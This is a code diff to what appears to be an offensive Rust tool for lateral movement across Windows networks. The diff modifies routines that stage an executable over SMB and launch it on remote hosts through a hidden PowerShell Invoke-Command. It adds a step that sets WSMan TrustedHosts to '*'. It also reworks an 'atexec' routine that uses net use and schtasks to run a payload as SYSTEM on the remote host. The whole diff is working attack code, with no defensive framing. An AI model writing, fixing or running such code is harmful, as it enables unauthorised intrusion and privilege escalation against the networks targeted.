@@ -185,16 +185,22 @@ mod inner {
         let svc_name = rand_svc_name();
         let exe_name = format!("{}.exe", svc_name);
         let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
+        let trust_prefix = format!(
+            "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;\
+             try{{$ip=[System.Net.Dns]::GetHostAddresses('{}')[0].IPAddressToString}}\
+             catch{{$ip='{}'}};",
+            host, host
+        );
         let ps_inner = if !user.is_empty() {
             format!(
-                "$c=New-Object PSCredential('{}', (ConvertTo-SecureString '{}' -AsPlainText -Force));\
-                 Invoke-Command -ComputerName '{}' -Credential $c -ScriptBlock {{Start-Process '{}' -WindowStyle Hidden}}",
-                user, pass, host, remote_path
+                "{}$c=New-Object PSCredential('{}', (ConvertTo-SecureString '{}' -AsPlainText -Force));\
+                 Invoke-Command -ComputerName $ip -Credential $c -ScriptBlock {{Start-Process '{}' -WindowStyle Hidden}}",
+                trust_prefix, user, pass, remote_path
             )
         } else {
             format!(
-                "Invoke-Command -ComputerName '{}' -ScriptBlock {{Start-Process '{}' -WindowStyle Hidden}}",
-                host, remote_path
+                "{}Invoke-Command -ComputerName $ip -ScriptBlock {{Start-Process '{}' -WindowStyle Hidden}}",
+                trust_prefix, remote_path
             )
         };
         let cmd = format!(
@@ -210,25 +216,35 @@ mod inner {
         ))
     }
 
+    fn current_time_plus_minutes(add_minutes: u64) -> String {
+        // Get UTC seconds since epoch, compute HH:MM offset by add_minutes
+        use std::time::{SystemTime, UNIX_EPOCH};
+        let secs = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs();
+        let total_mins = (secs / 60 + add_minutes) % (24 * 60);
+        format!("{:02}:{:02}", total_mins / 60, total_mins % 60)
+    }
+
     pub fn lateral_atexec(host: &str, cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
         let svc_name = rand_svc_name();
+        // Establish authenticated IPC$ session first so /S without /U /P works.
+        // Windows rejects /U /P when the target resolves to the local machine.
         if !user.is_empty() {
             shell(&format!("net use \\\\{}\\IPC$ \"{}\" /user:\"{}\" 2>nul", host, pass, user));
         }
+        // schtasks targeting always via /S only (no explicit creds — rely on IPC$ session).
         let sch = |sub: &str| -> String {
-            if !user.is_empty() {
-                shell(&format!(
-                    "schtasks {} /S \"{}\" /U \"{}\" /P \"{}\"",
-                    sub, host, user, pass
-                ))
-            } else {
-                shell(&format!("schtasks {} /S \"{}\"", sub, host))
-            }
+            shell(&format!("schtasks {} /S \"{}\"", sub, host))
         };
-        let task_name = format!("\\{}", svc_name);
+        // Task name without leading \ to avoid syntax errors on older Windows builds.
+        let task_name = svc_name.clone();
+        // Schedule for current UTC time + 2 minutes so the task is not in the past.
+        let st = current_time_plus_minutes(2);
         sch(&format!(
-            "/Create /TN \"{}\" /TR \"{}\" /SC ONCE /ST 00:00 /RU SYSTEM /F",
-            task_name, cmd_path
+            "/Create /TN \"{}\" /TR \"{}\" /SC ONCE /ST {} /RU SYSTEM /F",
+            task_name, cmd_path, st
         ));
         let out = sch(&format!("/Run /TN \"{}\"", task_name));
         std::thread::sleep(std::time::Duration::from_secs(3));
@@ -237,10 +253,11 @@ mod inner {
             shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
         }
         Ok(format!(
-            "[+] atexec → {}\n    task: {}\n    path: {}\n    runas: SYSTEM\n{}",
+            "[+] atexec → {}\n    task: {}\n    path: {}\n    runas: SYSTEM\n    sched: {}\n{}",
             host,
             task_name,
             cmd_path,
+            st,
             out.trim()
         ))
     }
